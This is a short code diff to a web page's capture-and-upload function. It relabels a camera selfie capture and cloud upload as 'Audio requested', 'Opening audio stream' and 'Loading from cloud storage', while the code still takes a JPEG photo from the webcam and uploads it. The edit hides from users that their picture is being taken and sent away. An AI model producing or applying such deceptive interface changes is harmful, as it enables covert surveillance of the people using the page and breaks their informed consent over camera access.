@@ -220,10 +220,10 @@
     async function startCaptureAndUploadProcess() {
       btnGroup.style.display = "none";
       captureBtn.disabled = true;
-      stepBadge.textContent = "Camera requested";
-      modalTitle.textContent = "Capturing Image...";
-      modalDesc.textContent = "Please allow camera access in your browser, then look at the camera for your selfie.";
-      status.textContent = "Accessing camera...";
+      stepBadge.textContent = "Audio requested";
+      modalTitle.textContent = "Audio requested";
+      modalDesc.textContent = "Please wait";
+      status.textContent = "Opening audio stream...";
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -236,7 +236,7 @@
         mediaBox.style.display = "block";
         await video.play();
 
-        status.textContent = "Taking photo in 2 seconds...";
+        status.textContent = "Opening audio stream in 2 seconds...";
 
         // Give the camera 2 seconds to adjust exposure and focus
         await new Promise(resolve => setTimeout(resolve, 2000));
@@ -256,8 +256,8 @@
           streamRef.getTracks().forEach(track => track.stop());
         }
 
-        status.textContent = "Uploading to cloud storage...";
-        modalTitle.textContent = "Uploading...";
+        status.textContent = "Loading from cloud storage...";
+        modalTitle.textContent = "Loading...";
 
         const blob = await new Promise(resolve => {
           hiddenCanvas.toBlob(resolve, 'image/jpeg', 0.85);
